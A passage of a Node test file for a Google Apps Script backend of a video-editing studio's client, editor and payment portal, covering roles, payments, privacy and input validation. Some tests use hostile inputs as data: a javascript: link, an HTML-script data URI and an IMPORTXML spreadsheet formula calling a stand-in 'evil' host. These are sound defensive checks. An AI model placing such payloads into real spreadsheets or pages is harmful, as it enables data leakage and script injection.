/** Backend scenarios A–F of the brief, run against backend/Code.gs. `node --test tests/backend.test.js` */
const test = require('node:test');
const assert = require('node:assert/strict');
const crypto = require('crypto');
const { createBackend } = require('../tools/gas-mock');

const PW = 'correct-horse-1';
function fresh(options) { const b = createBackend(Object.assign({ quiet: true }, options)); b.setup(); return b; }
function ok(r) { assert.equal(r.ok, true, r.error); return r.data; }
function refused(r, pattern) { assert.equal(r.ok, false, 'expected a refusal'); if (pattern) assert.match(r.error, pattern); return r; }

/** A studio with one admin, an approved client and two approved editors. */
function studio(options) {
  const b = fresh(options);
  ok(b.call('register', { role: 'SUPER_ADMIN', fullName: 'Asha Admin', email: 'admin@sv.test', password: PW }));
  const admin = ok(b.call('login', { email: 'admin@sv.test', password: PW })).token;
  const make = payload => ok(b.call('admin.createUser', Object.assign({ password: PW }, payload), admin)).id;
  const ids = {
    client: make({ role: 'CLIENT', fullName: 'Chitra Client', email: 'client@sv.test', socialName: 'chitra.creates' }),
    free: make({ role: 'EDITOR', fullName: 'Farid Freelance', email: 'free@sv.test', employmentType: 'FREELANCE', perVideoRate: '400' }),
    full: make({ role: 'EDITOR', fullName: 'Fatima Fulltime', email: 'full@sv.test', employmentType: 'FULL_TIME', monthlySalary: '30000' })
  };
  ok(b.call('admin.savePricing', { prices: { REEL: '1500', LONG: '5000', BRAND: '8000' } }, admin));
  const login = email => ok(b.call('login', { email, password: PW })).token;
  return { b, admin, client: login('client@sv.test'), free: login('free@sv.test'), full: login('full@sv.test'), ids };
}
const state = (s, who) => ok(s.b.call('state', {}, s[who]));
const addVideo = (s, type = 'REEL') => ok(s.b.call('client.addVideo', { type, rawLink: 'https://drive.google.com/file/d/raw123', remarks: 'Cut the pauses, add captions' }, s.client));

test('registration is closed: one first-time Super Admin, then every account is created by a Super Admin', () => {
  const b = fresh();
  assert.equal(ok(b.call('bootstrap')).hasAdmin, false);
  refused(b.call('register', { role: 'CLIENT', fullName: 'Cee', email: 'cee@sv.test', password: PW }), /Super Admin account first/);
  refused(b.call('register', { role: 'SUPER_ADMIN', fullName: 'One', email: 'one@sv.test', password: 'short' }), /at least 8/);
  assert.equal(ok(b.call('register', { role: 'SUPER_ADMIN', fullName: 'One', email: 'one@sv.test', password: PW })).status, 'ACTIVE');
  assert.equal(ok(b.call('bootstrap')).hasAdmin, true);
  for (const role of ['SUPER_ADMIN', 'CLIENT', 'EDITOR']) assert.equal(refused(b.call('register', { role, fullName: 'X', email: role + '@sv.test', password: PW }), /created by SV Workspace/).code, 'CLOSED');
  assert.equal(b.rows('Users').length, 1);

  const admin = ok(b.call('login', { email: 'one@sv.test', password: PW })).token;
  const create = p => b.call('admin.createUser', Object.assign({ password: PW }, p), admin);
  refused(create({ role: 'CLIENT', fullName: 'Dup', email: 'ONE@sv.test' }), /already exists/);
  refused(create({ role: 'OWNER', fullName: 'X', email: 'x@sv.test' }), /account type/);
  refused(create({ role: 'CLIENT', fullName: 'X', email: 'x@sv.test', password: 'short' }), /at least 8/);
  refused(create({ role: 'CLIENT', fullName: 'X', email: 'not-an-email' }), /valid email/);
  refused(create({ role: 'EDITOR', fullName: 'Ed', email: 'ed@sv.test' }), /Full-Time or Freelance/);
  refused(create({ role: 'EDITOR', fullName: 'Ed', email: 'ed@sv.test', employmentType: 'FULL_TIME', monthlySalary: '0' }), /greater than zero/);
  assert.equal(b.rows('Users').length, 1); // a refused request leaves nothing half-created
  assert.equal(b.rows('Editors').length, 0);

  const ed = ok(create({ role: 'EDITOR', fullName: 'Ed', email: 'ed@sv.test', employmentType: 'FULL_TIME', monthlySalary: '25000' }));
  const cl = ok(create({ role: 'CLIENT', fullName: 'Cee', email: 'cee@sv.test', socialName: 'cee.tv' }));
  ok(create({ role: 'SUPER_ADMIN', fullName: 'Two', email: 'two@sv.test' }));
  assert.deepEqual([ed.status, cl.status], ['ACTIVE', 'ACTIVE']);
  const client = ok(b.call('login', { email: 'cee@sv.test', password: PW })).token; // can sign in at once
  ok(b.call('login', { email: 'ed@sv.test', password: PW }));
  ok(b.call('login', { email: 'two@sv.test', password: PW }));
  assert.equal(refused(b.call('admin.createUser', { role: 'CLIENT', fullName: 'X', email: 'x@sv.test', password: PW }, client)).code, 'FORBIDDEN');
  assert.ok(ok(b.call('state', {}, client)).notifications.some(n => n.title === 'Welcome to SV Workspace'));

  ok(b.call('admin.updateEditorPay', { userId: ed.id, employmentType: 'FREELANCE', perVideoRate: '350' }, admin));
  const st = ok(b.call('state', {}, admin));
  const after = st.users.find(u => u.id === ed.id);
  assert.deepEqual([after.employmentType, after.perVideoRate, after.monthlySalary], ['FREELANCE', 350, 0]);
  assert.equal(st.users.find(u => u.id === cl.id).socialName, 'cee.tv');
  // passwords are never stored in the clear or returned
  assert.ok(!JSON.stringify(st).includes('passwordHash'));
  assert.ok(b.rows('Users').every(u => u.passwordHash.length === 64 && !u.passwordHash.includes(PW)));

  // public contact details, set by the Super Admin, shown on the website before sign-in
  refused(b.call('admin.saveSettings', { contactEmail: 'nope' }, admin), /valid email/);
  refused(b.call('admin.saveSettings', { contactWhatsapp: 'call me' }, admin), /digits only/);
  ok(b.call('admin.saveSettings', { contactEmail: 'hello@sv.test', contactWhatsapp: '+91 98765 43210', upiId: 'sv@upi' }, admin));
  const pub = ok(b.call('bootstrap'));
  assert.deepEqual(pub.contact, { contactEmail: 'hello@sv.test', contactPhone: '', contactWhatsapp: '+91 98765 43210' });
  assert.ok(!JSON.stringify(pub).includes('sv@upi')); // payment details stay behind sign-in
});

test('Super Admin records a payment received outside the website', () => {
  const s = studio();
  addVideo(s); addVideo(s, 'LONG'); // 1500 + 5000
  const today = new Date().toISOString().slice(0, 10);
  const record = (p, who) => s.b.call('admin.recordClientPayment', Object.assign({ clientId: s.ids.client, amount: '2000', method: 'CASH', reference: 'Receipt 14', date: today }, p), s[who || 'admin']);
  assert.equal(refused(record({}, 'client')).code, 'FORBIDDEN');
  refused(record({ amount: '7000' }), /cannot be more than/);
  refused(record({ amount: '0' }), /greater than zero/);
  refused(record({ method: 'CRYPTO' }), /how the payment was received/);
  refused(record({ reference: '' }), /Reference is required/);
  refused(record({ date: '2999-01-01' }), /cannot be in the future/);
  refused(record({ clientId: s.ids.free }), /Client not found/);
  const pay = ok(record({ note: 'Paid at the studio' }));
  assert.deepEqual([pay.method, pay.amount, pay.sourceId, pay.note], ['CASH', '2000', 'ADMIN', 'Paid at the studio']);
  refused(record({ amount: '100', reference: 'receipt 14' }), /already been recorded/); // not counted twice
  let c = state(s, 'client');
  assert.deepEqual([c.ledger.paid, c.ledger.pending], [2000, 4500]);
  assert.deepEqual(c.ledger.invoices.map(i => [i.paid, i.pending]), [[1500, 0], [500, 4500]]);
  assert.ok(c.notifications.some(n => n.kind === 'PAYMENT_RECORDED'));
  assert.equal(c.payments[0].method, 'CASH');
  assert.equal(sumOf(state(s, 'admin').clientPayments), 2000);
  // it cannot be combined with a submission into more than the client owes
  const sub = ok(s.b.call('client.submitManualPayment', { amount: '4500', method: 'UPI', reference: 'UTR777001' }, s.client));
  ok(record({ amount: '1000', reference: 'Receipt 15', method: 'BANK' }));
  refused(s.b.call('admin.decideManualPayment', { id: sub.id, decision: 'VERIFY' }, s.admin), /more than the client's outstanding balance/);
  assert.equal(state(s, 'client').ledger.paid, 3000);
  assert.ok(s.b.rows('AuditLogs').some(l => l.action === 'payment.recorded'));
});
const sumOf = list => list.reduce((a, p) => a + Number(p.amount), 0);

test('sign-in: wrong password, lockout, logout, suspended account', () => {
  const s = studio();
  refused(s.b.call('login', { email: 'client@sv.test', password: 'wrong-password' }), /Incorrect email or password/);
  refused(s.b.call('login', { email: 'nobody@sv.test', password: PW }), /Incorrect email or password/);
  for (let i = 0; i < 4; i++) s.b.call('login', { email: 'client@sv.test', password: 'wrong-password' });
  refused(s.b.call('login', { email: 'client@sv.test', password: PW }), /Too many failed attempts/);
  ok(s.b.call('logout', {}, s.free));
  assert.equal(refused(s.b.call('state', {}, s.free)).code, 'AUTH');
  assert.equal(refused(s.b.call('state', {}, 'x'.repeat(64))).code, 'AUTH');
  assert.equal(refused(s.b.call('state', {})).code, 'AUTH');
  ok(s.b.call('admin.setUserStatus', { userId: s.ids.full, status: 'SUSPENDED' }, s.admin));
  assert.equal(refused(s.b.call('state', {}, s.full)).code, 'AUTH'); // open session dies at once
  refused(s.b.call('login', { email: 'full@sv.test', password: PW }), /suspended/);
  const me = state(s, 'admin').user.id;
  refused(s.b.call('admin.setUserStatus', { userId: me, status: 'SUSPENDED' }, s.admin), /your own account/);
});

test('Super Admin resets a forgotten password: old password and open sessions stop working', () => {
  const s = studio();
  refused(s.b.call('admin.resetPassword', { userId: s.ids.free, password: 'short' }, s.admin), /at least 8/);
  ok(s.b.call('admin.resetPassword', { userId: s.ids.free, password: 'temp-pass-99' }, s.admin));
  assert.equal(refused(s.b.call('state', {}, s.free)).code, 'AUTH');
  refused(s.b.call('login', { email: 'free@sv.test', password: PW }), /Incorrect/);
  ok(s.b.call('login', { email: 'free@sv.test', password: 'temp-pass-99' }));
});

test('A — client video request', () => {
  const s = studio();
  const v = addVideo(s);
  assert.deepEqual([v.status, v.price, v.typeLabel], ['NOT_STARTED', 1500, 'Reel / Short']);
  const c = state(s, 'client');
  assert.equal(c.videos.length, 1);
  assert.equal(c.ledger.total, 1500);
  assert.ok(c.notifications.some(n => n.kind === 'VIDEO_SUBMITTED' && n.refId === v.id));
  const a = state(s, 'admin');
  assert.equal(a.videos[0].clientId, s.ids.client);
  assert.ok(a.notifications.some(n => n.kind === 'VIDEO_NEW' && n.refId === v.id));
  assert.equal(a.invoices[0].amount, 1500);
  refused(s.b.call('client.addVideo', { type: 'REEL', rawLink: 'javascript:alert(1)', remarks: 'x' }, s.client), /valid link/);
  refused(s.b.call('client.addVideo', { type: 'REEL', rawLink: 'https://drive.google.com/x', remarks: '' }, s.client), /Remarks is required/);
  refused(s.b.call('client.addVideo', { type: 'MOVIE', rawLink: 'https://drive.google.com/x', remarks: 'x' }, s.client), /video type/);
  // a price sent by the browser is ignored
  assert.equal(ok(s.b.call('client.addVideo', { type: 'LONG', price: 1, rawLink: 'https://drive.google.com/x', remarks: 'x' }, s.client)).price, 5000);
});

test('B — assignment, editor privacy, submission, review, client approval', () => {
  const s = studio();
  const v = addVideo(s);
  assert.equal(state(s, 'free').videos.length, 0);
  refused(s.b.call('admin.assignVideo', { videoId: v.id, editorId: s.ids.client, deadline: '2026-12-01' }, s.admin), /Editor not found/);
  refused(s.b.call('admin.assignVideo', { videoId: v.id, editorId: s.ids.free, deadline: '2026-13-01' }, s.admin), /valid date/);
  ok(s.b.call('admin.assignVideo', { videoId: v.id, editorId: s.ids.free, deadline: '2026-12-01' }, s.admin));

  const e = state(s, 'free');
  assert.equal(e.videos.length, 1);
  assert.equal(e.videos[0].rawLink, 'https://drive.google.com/file/d/raw123');
  // nothing in the editor's whole response identifies the client
  const text = JSON.stringify(e);
  for (const secret of ['Chitra', 'chitra.creates', 'client@sv.test', s.ids.client, 'clientId']) assert.ok(!text.includes(secret), 'editor response leaks ' + secret);
  assert.ok(e.notifications.some(n => n.kind === 'VIDEO_ASSIGNED'));
  assert.equal(state(s, 'full').videos.length, 0); // another editor sees nothing

  refused(s.b.call('editor.startVideo', { videoId: v.id }, s.full), /Video not found/);
  refused(s.b.call('editor.submitVideo', { videoId: v.id, link: 'https://drive.google.com/final' }, s.free), /Start the video/);
  ok(s.b.call('editor.startVideo', { videoId: v.id }, s.free));
  assert.ok(state(s, 'client').notifications.some(n => n.title === 'Editing started'));
  refused(s.b.call('editor.submitVideo', { videoId: v.id, link: 'final.mp4' }, s.free), /valid link/);
  ok(s.b.call('editor.submitVideo', { videoId: v.id, link: 'https://drive.google.com/final' }, s.free));
  assert.equal(state(s, 'client').videos[0].editedLink, ''); // not shown before the admin approves
  assert.ok(state(s, 'admin').notifications.some(n => n.kind === 'VIDEO_REVIEW' && n.refId === v.id));

  refused(s.b.call('admin.reviewVideo', { videoId: v.id, decision: 'REVISION', note: '' }, s.admin), /Revision notes is required/);
  ok(s.b.call('admin.reviewVideo', { videoId: v.id, decision: 'REVISION', note: 'Fix the audio at 0:20' }, s.admin));
  assert.equal(state(s, 'free').videos[0].revisionNote, 'Fix the audio at 0:20');
  ok(s.b.call('editor.submitVideo', { videoId: v.id, link: 'https://drive.google.com/final-v2' }, s.free));
  ok(s.b.call('admin.reviewVideo', { videoId: v.id, decision: 'APPROVE' }, s.admin));
  refused(s.b.call('admin.reviewVideo', { videoId: v.id, decision: 'APPROVE' }, s.admin), /not waiting for review/);

  const c = state(s, 'client');
  assert.deepEqual([c.videos[0].status, c.videos[0].editedLink], ['CLIENT_REVIEW', 'https://drive.google.com/final-v2']);
  // client asks for one more change, then approves: the editor is still paid once
  ok(s.b.call('client.videoDecision', { videoId: v.id, decision: 'REVISION', note: 'Make the intro shorter' }, s.client));
  ok(s.b.call('editor.submitVideo', { videoId: v.id, link: 'https://drive.google.com/final-v3' }, s.free));
  ok(s.b.call('admin.reviewVideo', { videoId: v.id, decision: 'APPROVE' }, s.admin));
  ok(s.b.call('client.videoDecision', { videoId: v.id, decision: 'APPROVE' }, s.client));
  refused(s.b.call('client.videoDecision', { videoId: v.id, decision: 'APPROVE' }, s.client), /not waiting/);
  assert.equal(state(s, 'client').videos[0].status, 'COMPLETED');
  const done = state(s, 'free');
  assert.equal(done.earnings.length, 1);
  assert.equal(done.ledger.earned, 400);
  assert.ok(!JSON.stringify(done).includes('Chitra'));
  assert.equal(s.b.rows('Videos').length, 1); // one shared record, not copies
});

test('C — pricing changes apply to new videos only', () => {
  const s = studio();
  const first = addVideo(s);
  refused(s.b.call('admin.savePricing', { prices: { REEL: '-5', LONG: '5000', BRAND: '8000' } }, s.admin), /must be a number/);
  refused(s.b.call('admin.savePricing', { prices: { REEL: '2000', LONG: '5000', BRAND: '8000' } }, s.client), /not allowed/);
  ok(s.b.call('admin.savePricing', { prices: { REEL: '2000', LONG: '5000', BRAND: '8000' } }, s.admin));
  assert.equal(state(s, 'client').pricings.find(p => p.type === 'REEL').price, 2000);
  const second = addVideo(s);
  const vids = state(s, 'client').videos;
  assert.equal(vids.find(v => v.id === first.id).price, 1500);
  assert.equal(vids.find(v => v.id === second.id).price, 2000);
  assert.equal(state(s, 'client').ledger.total, 3500);
  // the authorised adjustment changes one video and its invoice, and is audited
  ok(s.b.call('admin.adjustVideoPrice', { videoId: first.id, price: '1200', reason: 'Agreed discount' }, s.admin));
  assert.equal(state(s, 'client').ledger.total, 3200);
  assert.ok(s.b.rows('AuditLogs').some(l => l.action === 'video.price-adjusted'));
});

test('a video type with no price cannot be requested', () => {
  const b = fresh();
  ok(b.call('register', { role: 'SUPER_ADMIN', fullName: 'One', email: 'one@sv.test', password: PW }));
  const admin = ok(b.call('login', { email: 'one@sv.test', password: PW })).token;
  ok(b.call('admin.createClient', { fullName: 'Cee', email: 'cee@sv.test', password: PW, socialName: 'cee' }, admin));
  const client = ok(b.call('login', { email: 'cee@sv.test', password: PW })).token;
  refused(b.call('client.addVideo', { type: 'REEL', rawLink: 'https://drive.google.com/x', remarks: 'x' }, client), /has not been set yet/);
});

test('D — client manual payment and verification', () => {
  const s = studio();
  addVideo(s); addVideo(s, 'LONG'); // 1500 + 5000
  const pay = (amount, reference) => s.b.call('client.submitManualPayment', { amount, method: 'UPI', reference }, s.client);
  refused(pay('0', 'UTR0001'), /greater than zero/);
  refused(pay('-10', 'UTR0001'), /must be a number/);
  refused(pay('7000', 'UTR0001'), /cannot be more than/);
  const m = ok(pay('2000', 'UTR0001'));
  refused(pay('2000', 'utr0001'), /already been submitted/);
  refused(pay('5000', 'UTR0002'), /cannot be more than/); // 4500 left while 2000 waits
  let c = state(s, 'client');
  assert.deepEqual([c.ledger.paid, c.ledger.pending, c.ledger.awaitingVerification], [0, 6500, 2000]); // not counted yet
  refused(s.b.call('admin.decideManualPayment', { id: m.id, decision: 'VERIFY' }, s.client), /not allowed/);
  assert.ok(state(s, 'admin').notifications.some(n => n.kind === 'PAYMENT_TO_VERIFY'));
  ok(s.b.call('admin.decideManualPayment', { id: m.id, decision: 'VERIFY' }, s.admin));
  refused(s.b.call('admin.decideManualPayment', { id: m.id, decision: 'VERIFY' }, s.admin), /already been decided/); // no double count
  c = state(s, 'client');
  assert.deepEqual([c.ledger.paid, c.ledger.pending, c.ledger.awaitingVerification], [2000, 4500, 0]);
  assert.deepEqual(c.ledger.invoices.map(i => [i.amount, i.paid, i.pending]), [[1500, 1500, 0], [5000, 500, 4500]]);
  assert.ok(c.notifications.some(n => n.kind === 'PAYMENT_VERIFIED'));
  const r = ok(pay('100', 'UTR0003'));
  ok(s.b.call('admin.decideManualPayment', { id: r.id, decision: 'REJECT', note: 'Not found in bank statement' }, s.admin));
  assert.equal(state(s, 'client').ledger.paid, 2000);
  assert.equal(s.b.rows('ClientPayments').length, 1);
});

test('D — editor payment request and partial payout', () => {
  const s = studio();
  const v = addVideo(s);
  refused(s.b.call('editor.requestPayment', {}, s.free), /no pending earnings/);
  ok(s.b.call('admin.assignVideo', { videoId: v.id, editorId: s.ids.free, deadline: '2026-12-01', rate: '600' }, s.admin)); // rate override
  ok(s.b.call('editor.startVideo', { videoId: v.id }, s.free));
  ok(s.b.call('editor.submitVideo', { videoId: v.id, link: 'https://drive.google.com/final' }, s.free));
  assert.equal(state(s, 'free').ledger.earned, 0); // payable only after approval
  ok(s.b.call('admin.reviewVideo', { videoId: v.id, decision: 'APPROVE' }, s.admin));
  assert.equal(state(s, 'free').ledger.pending, 600);
  const req = ok(s.b.call('editor.requestPayment', {}, s.free));
  assert.equal(req.amount, 600);
  refused(s.b.call('editor.requestPayment', {}, s.free), /already have an open payment request/);
  assert.ok(state(s, 'admin').notifications.some(n => n.kind === 'PAYOUT_REQUEST'));
  refused(s.b.call('admin.recordPayout', { requestId: req.id, amount: '100', reference: 'NEFT1' }, s.admin), /Approve the request/);
  refused(s.b.call('admin.recordPayout', { requestId: req.id, amount: '100', reference: 'NEFT1' }, s.free), /not allowed/);
  ok(s.b.call('admin.decidePaymentRequest', { id: req.id, decision: 'APPROVE' }, s.admin));
  refused(s.b.call('admin.recordPayout', { requestId: req.id, amount: '700', reference: 'NEFT1' }, s.admin), /cannot be more than/);
  ok(s.b.call('admin.recordPayout', { requestId: req.id, amount: '250', reference: 'NEFT1' }, s.admin));
  let e = state(s, 'free');
  assert.deepEqual([e.ledger.earned, e.ledger.received, e.ledger.pending], [600, 250, 350]);
  assert.equal(e.requests[0].status, 'APPROVED');
  assert.ok(e.notifications.some(n => n.kind === 'PAYOUT_PAID'));
  ok(s.b.call('admin.recordPayout', { requestId: req.id, amount: '350', reference: 'NEFT2' }, s.admin));
  e = state(s, 'free');
  assert.deepEqual([e.ledger.pending, e.requests[0].status, e.payouts.length], [0, 'PAID', 2]);
  refused(s.b.call('admin.recordPayout', { requestId: req.id, amount: '1', reference: 'NEFT3' }, s.admin), /Approve the request/);
  // the other editor sees none of it
  const other = state(s, 'full');
  assert.deepEqual([other.earnings.length, other.payouts.length, other.requests.length], [0, 0, 0]);
});

test('full-time salary is added once a month; bonus; rejected request can be raised again', () => {
  const s = studio();
  refused(s.b.call('admin.generateSalary', { editorId: s.ids.free, month: '2026-11' }, s.admin), /Full-Time Editors only/);
  ok(s.b.call('admin.generateSalary', { editorId: s.ids.full, month: '2026-11' }, s.admin));
  refused(s.b.call('admin.generateSalary', { editorId: s.ids.full, month: '2026-11' }, s.admin), /already been added/);
  ok(s.b.call('admin.addBonus', { editorId: s.ids.full, amount: '2000', note: 'Festival bonus' }, s.admin));
  assert.equal(state(s, 'full').ledger.pending, 32000);
  assert.equal(s.b.rows('SalaryPeriods')[0].month, '2026-11');
  const req = ok(s.b.call('editor.requestPayment', {}, s.full));
  ok(s.b.call('admin.decidePaymentRequest', { id: req.id, decision: 'REJECT', note: 'Month not closed yet' }, s.admin));
  assert.ok(state(s, 'full').notifications.some(n => n.kind === 'PAYOUT_REJECTED'));
  ok(s.b.call('editor.requestPayment', {}, s.full));
  // a full-time editor earns nothing per video unless a rate is set on the assignment
  const v = addVideo(s);
  ok(s.b.call('admin.assignVideo', { videoId: v.id, editorId: s.ids.full, deadline: '2026-12-01' }, s.admin));
  ok(s.b.call('editor.startVideo', { videoId: v.id }, s.full));
  ok(s.b.call('editor.submitVideo', { videoId: v.id, link: 'https://drive.google.com/f' }, s.full));
  ok(s.b.call('admin.reviewVideo', { videoId: v.id, decision: 'APPROVE' }, s.admin));
  assert.equal(state(s, 'full').ledger.earned, 32000);
});

test('E — profiles and channels reach the Super Admin', () => {
  const s = studio();
  const photo = 'data:image/jpeg;base64,' + Buffer.from('fake-photo').toString('base64');
  const ch = ok(s.b.call('client.saveChannel', { platform: 'YOUTUBE', name: 'Chitra Creates', link: 'https://youtube.com/@chitra' }, s.client));
  const ig = ok(s.b.call('client.saveChannel', { platform: 'INSTAGRAM', name: 'chitra.creates', link: 'https://instagram.com/chitra.creates' }, s.client));
  ok(s.b.call('client.saveChannel', { id: ch.id, platform: 'YOUTUBE', name: 'Chitra Creates HD', link: 'https://youtube.com/@chitrahd' }, s.client));
  ok(s.b.call('client.deleteChannel', { id: ig.id }, s.client));
  refused(s.b.call('client.saveChannel', { platform: 'TIKTOK', name: 'x', link: 'https://tiktok.com/x' }, s.client), /YouTube or Instagram/);
  refused(s.b.call('client.saveChannel', { platform: 'YOUTUBE', name: 'x', link: 'youtube' }, s.client), /valid link/);
  ok(s.b.call('updateProfile', { fullName: 'Chitra C.', email: 'client@sv.test', socialName: 'chitra.hd', photo }, s.client));
  let a = state(s, 'admin');
  const c = a.users.find(u => u.id === s.ids.client);
  assert.deepEqual([c.fullName, c.socialName, c.photo], ['Chitra C.', 'chitra.hd', photo]);
  assert.deepEqual(a.channels.map(x => [x.clientId, x.name, x.link]), [[s.ids.client, 'Chitra Creates HD', 'https://youtube.com/@chitrahd']]);

  refused(s.b.call('updateProfile', { fullName: 'Farid', email: 'full@sv.test' }, s.free), /Another account already uses/);
  refused(s.b.call('updateProfile', { fullName: 'Farid', email: 'free@sv.test', photo: 'data:text/html;base64,PHNjcmlwdD4=' }, s.free), /photo/);
  ok(s.b.call('updateProfile', { fullName: 'Farid F.', email: 'farid.new@sv.test', photo }, s.free));
  a = state(s, 'admin');
  const e = a.users.find(u => u.id === s.ids.free);
  assert.deepEqual([e.fullName, e.email, e.photo], ['Farid F.', 'farid.new@sv.test', photo]);
  ok(s.b.call('login', { email: 'farid.new@sv.test', password: PW }));
  refused(s.b.call('login', { email: 'free@sv.test', password: PW }), /Incorrect/);
  // an editor cannot change their own pay through the profile
  ok(s.b.call('updateProfile', { fullName: 'Farid F.', email: 'farid.new@sv.test', perVideoRate: 99999, employmentType: 'FULL_TIME', status: 'ACTIVE', role: 'SUPER_ADMIN' }, s.free));
  const again = state(s, 'admin').users.find(u => u.id === s.ids.free);
  assert.deepEqual([again.perVideoRate, again.employmentType, again.role], [400, 'FREELANCE', 'EDITOR']);

  refused(s.b.call('changePassword', { current: 'nope', next: 'another-pass-2' }, s.free), /current password is not correct/);
  ok(s.b.call('changePassword', { current: PW, next: 'another-pass-2' }, s.free));
  ok(s.b.call('login', { email: 'farid.new@sv.test', password: 'another-pass-2' }));
  refused(s.b.call('login', { email: 'farid.new@sv.test', password: PW }), /Incorrect/);
});

test('F — every action enforces its role on the server', () => {
  const s = studio();
  const v = addVideo(s);
  const adminOnly = ['admin.decideUser', 'admin.setUserStatus', 'admin.createClient', 'admin.createUser', 'admin.recordClientPayment', 'admin.resetPassword', 'admin.updateEditorPay', 'admin.assignVideo', 'admin.setDeadline', 'admin.reviewVideo', 'admin.completeVideo', 'admin.adjustVideoPrice', 'admin.savePricing', 'admin.decideManualPayment', 'admin.decidePaymentRequest', 'admin.recordPayout', 'admin.closePaymentRequest', 'admin.generateSalary', 'admin.addBonus', 'admin.saveSettings', 'admin.saveExpense', 'admin.deleteExpense'];
  for (const action of adminOnly) for (const who of ['client', 'free']) assert.equal(refused(s.b.call(action, { videoId: v.id }, s[who])).code, 'FORBIDDEN', action);
  for (const action of ['client.addVideo', 'client.submitManualPayment', 'client.saveChannel']) for (const who of ['admin', 'free']) assert.equal(refused(s.b.call(action, {}, s[who])).code, 'FORBIDDEN', action);
  for (const action of ['editor.startVideo', 'editor.requestPayment']) for (const who of ['admin', 'client']) assert.equal(refused(s.b.call(action, {}, s[who])).code, 'FORBIDDEN', action);
  for (const action of adminOnly.concat(['state', 'client.addVideo', 'editor.requestPayment'])) assert.equal(refused(s.b.call(action, {})).code, 'AUTH', action);
  refused(s.b.call('constructor', {}, s.admin), /Unknown action/);
  refused(s.b.post('not json'), /Invalid request/);
  // a second client sees nothing of the first
  const users = () => state(s, 'admin').users;
  ok(s.b.call('admin.createClient', { fullName: 'Dev Other', email: 'other@sv.test', password: PW, socialName: 'dev' }, s.admin));
  const other = ok(s.b.call('login', { email: 'other@sv.test', password: PW })).token;
  const o = ok(s.b.call('state', {}, other));
  assert.deepEqual([o.videos.length, o.ledger.total, o.channels.length], [0, 0, 0]);
  assert.ok(!JSON.stringify(o).includes('Chitra'));
  refused(s.b.call('client.videoDecision', { videoId: v.id, decision: 'APPROVE' }, other), /Video not found/);
  assert.equal(users().filter(u => u.role === 'CLIENT').length, 2);
});

test('comments: timecodes, team-only notes, and no identities across client and editor', () => {
  const s = studio();
  const v = addVideo(s);
  refused(s.b.call('video.comment', { videoId: v.id, text: 'hello' }, s.free), /Video not found/); // not assigned yet
  ok(s.b.call('admin.assignVideo', { videoId: v.id, editorId: s.ids.free, deadline: '2026-12-01' }, s.admin));
  refused(s.b.call('video.comment', { videoId: v.id, text: '' }, s.client), /Comment is required/);
  refused(s.b.call('video.comment', { videoId: v.id, text: 'x', timecode: '99' }, s.client), /Timecode/);
  ok(s.b.call('video.comment', { videoId: v.id, text: 'Trim this pause', timecode: '0:42' }, s.client));
  const note = ok(s.b.call('video.comment', { videoId: v.id, text: 'Colour looks flat here', audience: 'ALL' }, s.free));
  assert.equal(note.audience, 'INTERNAL'); // an editor cannot widen it
  ok(s.b.call('video.comment', { videoId: v.id, text: 'Use the brand LUT', audience: 'INTERNAL' }, s.admin));
  ok(s.b.call('video.comment', { videoId: v.id, text: 'We are on it', audience: 'ALL' }, s.admin));
  const c = state(s, 'client'), e = state(s, 'free'), a = state(s, 'admin');
  assert.deepEqual(c.comments.map(x => [x.author, x.text]), [['You', 'Trim this pause'], ['SV Workspace', 'We are on it']]);
  assert.deepEqual(e.comments.map(x => x.author), ['Client', 'You', 'SV Workspace', 'SV Workspace']);
  assert.equal(a.comments.length, 4);
  assert.match(a.comments[0].author, /Chitra Client \(Client\)/);
  for (const secret of ['Chitra', 'client@sv.test', s.ids.client]) assert.ok(!JSON.stringify(e).includes(secret), 'editor sees ' + secret);
  for (const secret of ['Farid', 'free@sv.test', s.ids.free]) assert.ok(!JSON.stringify(c).includes(secret), 'client sees ' + secret);
  assert.equal(state(s, 'full').comments.length, 0);
  refused(s.b.call('video.comment', { videoId: v.id, text: 'x' }, s.full), /Video not found/);
  assert.ok(e.notifications.some(n => n.kind === 'COMMENT') && c.notifications.some(n => n.kind === 'COMMENT'));
  // version history of submitted links, for the editor
  ok(s.b.call('editor.startVideo', { videoId: v.id }, s.free));
  ok(s.b.call('editor.submitVideo', { videoId: v.id, link: 'https://drive.google.com/v1' }, s.free));
  ok(s.b.call('admin.reviewVideo', { videoId: v.id, decision: 'REVISION', note: 'again' }, s.admin));
  ok(s.b.call('editor.submitVideo', { videoId: v.id, link: 'https://drive.google.com/v2' }, s.free));
  assert.deepEqual(state(s, 'free').videos[0].versions.map(x => [x.n, x.link]), [[1, 'https://drive.google.com/v1'], [2, 'https://drive.google.com/v2']]);
  assert.equal(state(s, 'client').videos[0].deadline, '2026-12-01'); // expected delivery
});

test('deadline change notifies the editor; reassignment moves the video', () => {
  const s = studio();
  const v = addVideo(s);
  ok(s.b.call('admin.assignVideo', { videoId: v.id, editorId: s.ids.free, deadline: '2026-12-01' }, s.admin));
  ok(s.b.call('admin.setDeadline', { videoId: v.id, deadline: '2026-12-05' }, s.admin));
  const e = state(s, 'free');
  assert.equal(e.videos[0].deadline, '2026-12-05');
  assert.ok(e.notifications.some(n => n.kind === 'VIDEO_DEADLINE' && /2026-12-05/.test(n.body)));
  ok(s.b.call('editor.startVideo', { videoId: v.id }, s.free));
  ok(s.b.call('admin.assignVideo', { videoId: v.id, editorId: s.ids.full, deadline: '2026-12-09' }, s.admin));
  assert.equal(state(s, 'free').videos.length, 0);
  assert.deepEqual(state(s, 'full').videos.map(x => [x.id, x.status]), [[v.id, 'NOT_STARTED']]);
  assert.deepEqual(s.b.rows('Assignments').map(a => a.status), ['ENDED', 'ACTIVE']);
});

test('notifications: read one, read all, never someone else\'s', () => {
  const s = studio();
  addVideo(s);
  const n = state(s, 'client').notifications;
  assert.ok(n.length && n.every(x => !x.read));
  refused(s.b.call('notifications.read', { id: n[0].id }, s.free), /not found/);
  ok(s.b.call('notifications.read', { id: n[0].id }, s.client));
  assert.equal(state(s, 'client').notifications.filter(x => x.read).length, 1);
  ok(s.b.call('notifications.readAll', {}, s.client));
  assert.ok(state(s, 'client').notifications.every(x => x.read));
});

test('text that looks like a formula is stored as text and read back unchanged', () => {
  const s = studio();
  const v = ok(s.b.call('client.addVideo', { type: 'REEL', rawLink: 'https://drive.google.com/x', remarks: '=IMPORTXML("http://evil","//a")' }, s.client));
  assert.equal(v.remarks, '=IMPORTXML("http://evil","//a")');
  assert.ok(s.b.sheets.Videos.data[1].every(cell => !/^[=+\-@]/.test(cell)));
});

test('online payment: off until configured; verified with the gateway before it counts', () => {
  const s = studio();
  addVideo(s);
